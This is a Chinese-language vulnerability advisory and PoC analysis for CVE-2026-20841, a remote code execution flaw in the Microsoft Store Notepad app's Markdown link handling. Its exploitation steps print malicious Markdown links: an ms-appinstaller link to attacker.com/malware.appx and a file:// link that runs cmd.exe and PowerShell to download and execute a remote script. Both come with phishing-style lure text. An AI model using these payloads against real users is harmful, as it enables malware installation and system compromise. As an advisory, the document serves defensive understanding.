## CVE-2026-20841 - Windows Notepad App (Microsoft Store version) 远程代码执行 (RCE)

**漏洞编号:** CVE-2026-20841

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Windows Notepad App (Microsoft Store version)

**危害等级:** 高危

**CVSS评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C (8.8)

**影响版本:** builds prior to 11.2510

**利用条件:** 需要用户交互，无需认证，网络可达

**POC 可用性:** 7

**POC 类型:** 概念验证

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2026-20841描述了现代Microsoft Windows记事本应用程序（通过Microsoft Store分发版本）中存在的一个高危远程代码执行（RCE）漏洞。该漏洞的根源在于记事本在2025年5月新增的Markdown渲染及可点击链接功能中，对URI协议的解析和校验不足。攻击者可以构造包含恶意协议链接的Markdown文件（例如，利用`ms-appinstaller://`或`file://`协议），并诱导用户在易受攻击的记事本中打开该文件并点击链接。一旦用户点击，系统将尝试执行与恶意URI关联的协议处理程序，从而导致任意应用程序的安装或本地系统命令的执行，最终实现与当前用户相同权限的远程代码执行。微软已于2026年2月的“补丁星期二”期间修复此漏洞，CVSS评分高达8.8分，并有报告指出该漏洞已被在野利用。此漏洞再次提醒我们，即使是看似基础且受信任的核心应用程序，在功能迭代时也可能引入新的高风险攻击面。

**POC有效性分析**

提供的概念验证（POC）代码`PoC.md`简洁而高效地展示了CVE-2026-20841的核心缺陷。它通过两个清晰的示例，直观地说明了漏洞的利用方式。第一个示例`[test](ms-appinstaller://?source=https://evil-domain.xxx/xxx.appx)`利用`ms-appinstaller`协议。当用户在脆弱的记事本中点击此链接时，Windows应用程序安装程序将被调用，尝试从攻击者控制的远程域下载并安装一个`.appx`应用程序包。这有效地将简单的Markdown点击转化为潜在的任意应用程序部署尝试。第二个示例`[test](file://C:/windows/system32/cmd.exe)`则展示了本地二进制文件的直接执行。点击此链接将立即启动`cmd.exe`，即命令提示符，使攻击者能够以当前用户的权限执行任何命令行指令。这两个示例都非常直观、直接，且只需攻击者控制`evil-domain.xxx`即可进行测试，无需复杂的环境搭建或额外工具，仅依赖于记事本应用本身。该POC充分验证了不当URI方案验证的存在性及其可利用性，是一个高质量的远程代码执行概念验证。

**利用步骤**

1.  **目标识别与准备：** 攻击者首先需要识别运行着易受攻击版本的Windows记事本应用（Microsoft Store版本，构建版本低于11.2510）的目标系统。
2.  **恶意Payload制作：** 攻击者精心制作一个包含恶意超链接的Markdown文件（例如，`malicious.md`）。这些链接是利用记事本URI处理缺陷的关键。
    *   **选项A（远程应用安装）：** 攻击者可以嵌入`[点击更新](ms-appinstaller://?source=https://attacker.com/malware.appx)`之类的链接，其中`malware.appx`是攻击者在其服务器上托管的恶意应用程序包。
    *   **选项B（本地命令执行）：** 攻击者可以嵌入`[查看详细报告](file://C:/Windows/System32/calc.exe)`（用于演示）或更复杂的`[下载发票](file://C:/Windows/System32/cmd.exe /c "powershell -Command Invoke-WebRequest -Uri http://attacker.com/malicious_script.ps1 -OutFile C:/Users/Public/script.ps1; Start-Process C:/Users/Public/script.ps1")`等链接，用于直接执行本地命令或下载执行远程脚本。
3.  **分发与诱骗：** 攻击者将制作好的`malicious.md`文件通过鱼叉式网络钓鱼邮件作为附件、嵌入到被入侵的网站上、或通过社交工程手段分发给受害者。
4.  **用户交互与触发：** 受害者接收并使用易受攻击的记事本应用打开`malicious.md`文件。记事本将渲染Markdown内容，并显示攻击者精心制作的链接。攻击者随后通过社会工程学诱导受害者点击该恶意链接（通常需要按住`Ctrl`键并点击）。
5.  **代码执行：** 一旦链接被点击，记事本会尝试解析并执行对应的URI。
    *   如果使用`ms-appinstaller://`，Windows会提示用户（或直接启动）从`attacker.com`安装`malware.appx`。
    *   如果使用`file://`，指定的本地可执行文件（如`cmd.exe`、`calc.exe`）或脚本将直接以当前登录用户的权限启动，从而实现远程代码执行。
    这种攻击链利用了用户对记事本的信任，通常会由于用户桌面应用享有的高权限而导致严重后果。

**投毒风险分析**

提供的`PoC.md`文件在“投毒”方面具有极低的风险。它是一个纯文本的Markdown文件，仅包含两个示例链接，用于演示漏洞机制。文件中没有任何可执行代码、嵌入式脚本、混淆代码或外部依赖项，因此其本身不会直接构成恶意威胁。链接中指向的路径，如`https://evil-domain.xxx/xxx.appx`和`C:/windows/system32/cmd.exe`，都是用于概念验证的占位符或系统自带的无害程序。这意味着下载和审查此特定POC文件本身，几乎不会带来恶意软件感染或系统受损的风险。该POC的“风险”仅在于其清晰地演示了如何利用一个真实的漏洞。如果一个真正的攻击者要利用此漏洞，他们会将`evil-domain.xxx`替换为他们实际的恶意服务器地址，并将`cmd.exe`替换为更具隐蔽性或杀伤力的恶意Payload。因此，尽管该漏洞本身具有高危的远程代码执行风险，但我们分析的这个POC代码是干净、透明且专门为安全研究和验证目的而设计的。组织可以安全地审查和分析此特定POC，而不必担心它是一个特洛伊木马或包含隐藏的恶意软件。鉴于其纯文本的性质和仅包含示范性链接，该特定POC的投毒风险极低，评估为10%，这主要考虑到外部链接的存在，理论上其目标地址可能被上游恶意篡改（尽管在此案例中未发生）。

**项目地址:** None

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-20841
